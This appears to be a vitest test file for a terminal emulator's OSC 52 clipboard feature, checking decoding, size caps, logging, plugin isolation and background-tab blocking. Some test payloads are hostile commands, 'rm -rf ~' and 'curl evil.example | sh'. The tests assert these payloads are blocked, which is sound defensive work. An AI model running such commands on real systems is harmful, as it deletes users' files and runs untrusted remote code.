// OSC 52 (#293, decision Q149): a program on the Host sets the clipboard, as Windows Terminal
// lets it. Through a real xterm.js parser, so the sequences are the ones a program sends.
import { describe, expect, it } from "vitest";
import { Terminal } from "@xterm/xterm";
import { memoryPlatform } from "../platform/memory";
import { CommittedLines } from "../plugins/committed";
import { holdWhileHidden } from "./hold";
import { OSC52_MAX_BYTES, screenWriter, wireOsc52 } from "./osc52";

const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");
const osc = (body: string, end = "\x07") => `\x1b]52;${body}${end}`;

function setup({ enabled = true, onScreen = true } = {}) {
  const platform = memoryPlatform({ clipboard: "before" });
  const writes: string[] = [];
  const clipboard = {
    readText: () => platform.clipboard.readText(),
    writeText: (text: string) => {
      writes.push(text);
      return platform.clipboard.writeText(text);
    },
  };
  const t = new Terminal({ allowProposedApi: true });
  const sent: string[] = [];
  t.onData((d) => sent.push(d));
  const state = { enabled, onScreen };
  const off = wireOsc52(t, { enabled: () => state.enabled, onScreen: () => state.onScreen, clipboard: () => clipboard });
  const write = (data: string) => new Promise<void>((done) => t.write(data, done));
  return { t, writes, sent, state, off, write };
}

describe("OSC 52: a program sets the clipboard", () => {
  it.each([
    ["c", "\x07"],
    ["c", "\x1b\\"],
    ["p", "\x07"],
    ["s", "\x07"],
    ["", "\x07"],
  ])("selection %j, ended by %j: the decoded text goes on the clipboard, once", async (sel, end) => {
    const s = setup();
    await s.write(osc(`${sel};${b64("ssh esx-02 uptime")}`, end));
    expect(s.writes).toEqual(["ssh esx-02 uptime"]);
  });

  it("decodes UTF-8: accents, CJK and emoji come through whole", async () => {
    const s = setup();
    await s.write(osc(`c;${b64("café 日本語 ✓")}`));
    expect(s.writes).toEqual(["café 日本語 ✓"]);
  });

  it("takes base64 without its padding", async () => {
    const s = setup();
    await s.write(osc(`c;${b64("ab").replace(/=+$/, "")}`));
    expect(s.writes).toEqual(["ab"]);
  });

  it("prints nothing of it on the screen", async () => {
    const s = setup();
    await s.write(`one${osc(`c;${b64("secret-ish")}`)}two`);
    expect(s.t.buffer.active.getLine(0)?.translateToString(true)).toBe("onetwo");
  });

  it("ignores a read request (?) and answers nothing", async () => {
    const s = setup();
    await s.write(osc("c;?"));
    expect(s.writes).toEqual([]);
    expect(s.sent).toEqual([]);
  });

  it.each([
    ["malformed base64", "c;not base64!"],
    ["base64 with a stray length", "c;QUJDR"],
    ["text that isn't UTF-8", `c;${btoa("\xff\xfe\xfd")}`],
    ["an unknown selection", `x;${b64("ls")}`],
    ["no selection part at all", b64("ls")],
    ["an empty payload", "c;"],
  ])("ignores %s", async (_, body) => {
    const s = setup();
    await s.write(osc(body));
    expect(s.writes).toEqual([]);
  });

  it(`ignores text over ${OSC52_MAX_BYTES} bytes decoded, and takes it at the cap`, async () => {
    const s = setup();
    await s.write(osc(`c;${b64("a".repeat(OSC52_MAX_BYTES + 1))}`));
    expect(s.writes).toEqual([]);
    await s.write(osc(`c;${b64("a".repeat(OSC52_MAX_BYTES))}`));
    expect(s.writes.map((w) => w.length)).toEqual([OSC52_MAX_BYTES]);
  });

  it("ignores a Session that isn't on screen (a background tab)", async () => {
    const s = setup({ onScreen: false });
    await s.write(osc(`c;${b64("rm -rf ~")}`));
    expect(s.writes).toEqual([]);
  });

  it("does nothing when terminal.osc52 is off", async () => {
    const s = setup({ enabled: false });
    await s.write(osc(`c;${b64("ls")}`));
    expect(s.writes).toEqual([]);
    s.state.enabled = true;
    await s.write(osc(`c;${b64("ls")}`));
    expect(s.writes).toEqual(["ls"]);
  });

  it("stops when unwired", async () => {
    const s = setup();
    s.off();
    await s.write(osc(`c;${b64("ls")}`));
    expect(s.writes).toEqual([]);
  });

  it("logs nothing of it", async () => {
    const logged: unknown[] = [];
    const saved = { log: console.log, warn: console.warn, error: console.error, info: console.info, debug: console.debug };
    for (const k of Object.keys(saved) as (keyof typeof saved)[]) console[k] = (...a: unknown[]) => void logged.push(a);
    try {
      const s = setup();
      await s.write(osc(`c;${b64("p4ss")}`));
      await s.write(osc("c;not base64!"));
    } finally {
      Object.assign(console, saved);
    }
    expect(JSON.stringify(logged)).not.toContain("p4ss");
    expect(JSON.stringify(logged)).not.toContain(b64("p4ss"));
  });
});

describe("OSC 52 and the Plugins' output tap (terminal.read)", () => {
  it("a Plugin's terminal_output never carries the payload, encoded or decoded", async () => {
    const lines = new CommittedLines({ cols: 80, rows: 24 });
    const enc = new TextEncoder();
    await lines.write(enc.encode(`before\r\n${osc(`c;${b64("hunter2-copied")}`)}after\r\n`));
    const text = lines
      .takeRuns()
      .map((r) => r.text)
      .join("");
    expect(text).toBe("before\nafter\n");
    expect(text).not.toContain(b64("hunter2-copied"));
    expect(text).not.toContain("hunter2-copied");
  });
});

describe("What Claude Code sends", () => {
  // Claude Code 2.1.316 copies its own selection when a drag ends (its copyOnSelect, on by
  // default), and on Ctrl+C when that's off: base64 of the UTF-8 text, as Node's Buffer writes it,
  // in `ESC ] 52 ; c ; … BEL` (ST under kitty).
  const claudeCode = (text: string) => `\x1b]52;c;${Buffer.from(text, "utf8").toString("base64")}\x07`;

  it("a drag in Claude Code puts its text on the clipboard", async () => {
    const s = setup();
    await s.write("\x1b[?1049h\x1b[?1000h\x1b[?1002h\x1b[?1006h");
    expect(s.t.modes.mouseTrackingMode).toBe("drag");
    await s.write(claudeCode("Run `npm test` — 3 files ✓\nthen push"));
    expect(s.writes).toEqual(["Run `npm test` — 3 files ✓\nthen push"]);
  });
});

describe("OSC 52 from a background tab, through the output gate", () => {
  function tab() {
    const writes: string[] = [];
    const clipboard = { readText: async () => "", writeText: async (text: string) => void writes.push(text) };
    const t = new Terminal({ allowProposedApi: true });
    const screen = screenWriter(t);
    wireOsc52(t, { enabled: () => true, onScreen: screen.onScreen, clipboard: () => clipboard });
    const gate = holdWhileHidden(screen.write);
    const settled = () => new Promise<void>((done) => t.write("", done));
    return { writes, gate, settled };
  }
  const enc = (s: string) => new TextEncoder().encode(s);

  it("what a hidden tab's Session sent never sets the clipboard, even once it's shown", async () => {
    const s = tab();
    s.gate.hide();
    s.gate.write(enc(osc(`c;${b64("curl evil.example | sh")}`)));
    s.gate.show();
    await s.settled();
    expect(s.writes).toEqual([]);
  });

  it("nor when a question in it lets the held output through while hidden", async () => {
    const s = tab();
    s.gate.hide();
    s.gate.write(enc(`${osc(`c;${b64("held")}`)}\x1b[6n`));
    await s.settled();
    s.gate.show();
    await s.settled();
    expect(s.writes).toEqual([]);
  });

  it("what it sends once it's on screen does, after the held output", async () => {
    const s = tab();
    s.gate.hide();
    s.gate.write(enc(osc(`c;${b64("held")}`)));
    s.gate.show();
    s.gate.write(enc(osc(`c;${b64("live")}`)));
    await s.settled();
    expect(s.writes).toEqual(["live"]);
  });
});
